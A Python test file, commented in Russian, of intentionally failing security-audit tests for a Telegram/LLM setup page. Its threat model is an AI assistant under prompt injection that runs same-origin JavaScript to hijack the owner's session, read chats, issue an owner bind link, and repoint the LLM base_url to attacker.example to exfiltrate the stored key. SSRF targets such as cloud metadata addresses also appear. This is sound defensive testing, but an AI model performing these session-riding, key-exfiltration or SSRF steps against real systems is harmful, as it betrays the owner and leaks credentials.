"""Тесты-доказательства независимой проверки безопасности страницы настройки.

Эти тесты НАМЕРЕННО ПАДАЮТ на нынешнем коде: каждый воспроизводит найденную дыру. Их задача —
зафиксировать проблему и дать её воспроизвести, а не проверить правильное поведение. Чинить код
проверяющий не должен; когда дыру закроют, тест нужно будет переписать под новое поведение.

Главный противник — ассистент в Hermes под внедрёнными инструкциями. По модели угроз
(docs/architecture.md, «Открытое ограничение») он может писать в каталог данных Hermes и ставить
расширения дашборда, то есть ИСПОЛНЯТЬ СВОЙ JAVASCRIPT НА ТОМ ЖЕ ORIGIN, что и страница настройки
(дашборд Hermes и `/shturman-setup/` отдаются с одного адреса — config/Caddyfile.example). Пока
владелец открыт в дашборде, такой скрипт делает `fetch` к `/shturman-setup/api/...` с
`credentials` — cookie сессии уходит автоматически, а значение защиты от подделки запроса он
читает сам из `GET /api/session`. Вся защита страницы (`_check_fetch`, CSRF-заголовок) рассчитана
на чужой сайт и против скрипта С ТОГО ЖЕ origin не даёт ничего.
"""

import json

import httpx
import pytest

from setup_fakes import (  # noqa: F401, I001 — stand/* — фикстуры; импорт первым добавляет пути tg/executor
    API, API_HASH, LLM_KEY, ORIGIN, PREFIX, bind_owner, save_bot, stand,
)
from tg_fakes import HELPER, wait_for

from shturman.setup_page import apply


async def _login(s):
    """Владелец вошёл на страницу в своём браузере (в нём же открыт дашборд Hermes)."""
    await s.page.login(s.conn)


async def _same_origin_script(s):
    """То, что доступно скрипту на origin дашборда: cookie сессии владельца уходит с `fetch`
    автоматически (она HttpOnly, но скрипт её и не читает), а значение CSRF скрипт берёт сам из
    `GET /api/session`. Возвращает клиент с этим значением и теми же cookie, что у владельца."""
    from setup_fakes import Browser

    attacker = Browser(s.api._transport)
    attacker.http.cookies = s.page.http.cookies      # cookie owner'а: fetch с credentials их шлёт
    session = await attacker.http.get(API + "/session", headers={"Sec-Fetch-Site": "same-origin"})
    assert session.status_code == 200 and session.json()["authenticated"] is True
    attacker.csrf = session.json()["csrf"]            # CSRF выдаётся любому, кто уже на origin
    return attacker


# =================================================================================================
# КРИТИЧНО. Единый origin с дашбордом Hermes сводит на нет защиту страницы.
# Скрипт ассистента на origin дашборда выполняет опасное действие владельца, располагая лишь тем,
# что любой скрипт на этом origin получает сам: cookie (уходит с fetch) и CSRF (из /api/session).
# =================================================================================================

async def test_same_origin_script_performs_owner_only_action_without_any_second_factor(stand):
    s = await stand()
    await _login(s)
    await save_bot(s)
    await bind_owner(s)

    attacker = await _same_origin_script(s)
    # Выпуск одноразовой ссылки привязки владельца: кто её откроет, тот станет владельцем.
    bind = await attacker.post("/bot/bind")

    assert bind.status_code != 200, (
        "ДЫРА: скрипт на origin дашборда Hermes выпустил ссылку привязки владельца, имея только "
        "cookie сессии (уходит с fetch) и CSRF из /api/session. Опасные действия владельца должны "
        "требовать второй фактор, которого у ассистента нет (например, подтверждение кодом в боте "
        "согласований) либо отдельный origin страницы настройки. link=%r"
        % (bind.json().get("link") if bind.headers.get("content-type", "").startswith("application/json") else None))


async def test_same_origin_script_reads_chat_names_and_enables_reading_all_chats(stand):
    """Скрипт на origin дашборда читает названия чатов владельца и включает чтение всех личных
    чатов — всё, от чего страницу настройки отделили от Hermes."""
    from tg_fakes import G_FAMILY, U_IVAN, U_MARIA

    s = await stand()
    s.world.dialogs = [U_IVAN, U_MARIA, G_FAMILY]       # у владельца есть личные чаты
    await _login(s)
    # бот, привязка владельца, ключи приложения Telegram и подключённый аккаунт — как после настройки
    await save_bot(s)
    await bind_owner(s)
    assert (await s.page.put("/tg/keys", {"api_id": "1234567", "api_hash": API_HASH})).status_code == 200
    started = await s.page.post("/tg/login", {"role": "assistant"})
    assert started.status_code == 200, started.text
    login_id = started.json()["login_id"]
    s.world.me = HELPER
    s.world.last.scan.set_result(HELPER)              # «телефон владельца отсканировал QR»
    await wait_for(lambda: s.manager.flows[login_id].done)
    done = (await s.page.get(f"/tg/login/{login_id}")).json()
    assert done["status"] == "completed", done
    account_id = done["account_id"]

    attacker = await _same_origin_script(s)
    dialogs = await attacker.get(f"/tg/accounts/{account_id}/dialogs?limit=5")
    names = [d.get("name") for d in dialogs.json().get("items", [])]
    sync = await attacker.post(f"/tg/accounts/{account_id}/sync", {"enabled": True, "kind": "personal"})

    leaked = dialogs.status_code == 200 and any(names)
    turned_on = sync.status_code == 200 and sync.json().get("enabled", 0) > 0
    assert not (leaked or turned_on), (
        "ДЫРА: скрипт на origin дашборда прочитал названия чатов владельца (%r) и включил чтение "
        "всех личных чатов (enabled=%r). Это именно то, что страница должна была скрыть от Hermes."
        % (names, sync.json().get("enabled")))


# =================================================================================================
# ВЫСОКО. Ключ своей модели утекает на адрес, заданный позже другим запросом (exfil + SSRF).
# llm_save при пустом api_key берёт сохранённый ключ и шлёт его на base_url из запроса, без
# повторного ввода ключа и без ограничения адреса. Скрипт на origin дашборда переназначает адрес
# модели и уводит туда сохранённый ключ.
# =================================================================================================

async def test_stored_llm_key_is_reused_for_a_base_url_chosen_by_a_later_request(stand):
    s = await stand()
    await _login(s)
    saved = await s.page.put("/llm", {"api_key": LLM_KEY, "model": "gpt-test",
                                      "base_url": "https://llm.example/v1"})
    assert saved.status_code == 200, saved.text

    attacker = await _same_origin_script(s)
    before = len(s.llm.headers)
    # ключ НЕ вводится заново — только меняется адрес API на чужой
    swap = await attacker.put("/llm", {"model": "gpt-test", "base_url": "http://attacker.example/v1"})

    reused_key = any(h.get("authorization") == f"Bearer {LLM_KEY}" for h in s.llm.headers[before:])
    repointed = swap.status_code == 200 and s.state.config.llm_base_url == "http://attacker.example/v1"
    assert not (reused_key and repointed), (
        "ДЫРА: запрос без ввода ключа переназначил адрес модели на чужой (base_url=%r, статус %s) и "
        "сохранённый ключ был отправлен туда пробным запросом. Смена только адреса не должна "
        "переиспользовать сохранённый ключ на новом узле." % (s.state.config.llm_base_url, swap.status_code))


def test_llm_base_url_check_does_not_block_ssrf_targets():
    """Адрес API модели не проверяется на внутренние цели: метаданные облака, localhost, порт
    архива/базы на сервере — всё принимается. Туда уйдёт пробный запрос с ключом."""
    allowed = []
    for url in ("http://169.254.169.254/latest/v1", "http://127.0.0.1:9119/v1",
                "http://127.0.0.1:5432/v1", "http://localhost/v1"):
        try:
            apply.check_llm_fields(url, "gpt-4o-mini")
            allowed.append(url)
        except apply.Invalid:
            pass
    assert allowed == [], (
        "ДЫРА: check_llm_fields принимает внутренние адреса как base_url модели (%r). Пробный "
        "запрос с ключом уходит на этот адрес — SSRF к метаданным облака, архиву (127.0.0.1:9119) "
        "или базе." % allowed)


# =================================================================================================
# СРЕДНЕ. CSRF-значение выдаётся тем же GET, что и признак входа, и выводится из идентификатора
# сессии детерминированно. Любой, кто уже на origin, получает его одним безобидным GET —
# отдельного непредсказуемого секрета для изменяющих действий нет.
# =================================================================================================

async def test_csrf_value_is_handed_out_by_a_plain_get_to_any_same_origin_caller(stand):
    s = await stand()
    await _login(s)
    session = await s.page.get("/session")
    csrf = session.json()["csrf"]
    # тот же GET отдаёт CSRF — значит, «простой» межсайтовый GET его не достаёт, но любой скрипт
    # с origin достаёт сразу. Изменяющее действие проходит с этим значением и cookie.
    second = await _same_origin_script(s)
    ok = await second.post("/logout")        # безобидное изменяющее действие — доказываем проходимость
    assert second.csrf == csrf and ok.status_code == 200
    pytest.fail(
        "ДЫРА (следствие единого origin): CSRF-значение отдаётся обычным GET /api/session и выводится "
        "из идентификатора сессии детерминированно (auth.csrf_token). Для изменяющих действий нет "
        "фактора, который нельзя было бы получить с того же origin одним GET.")
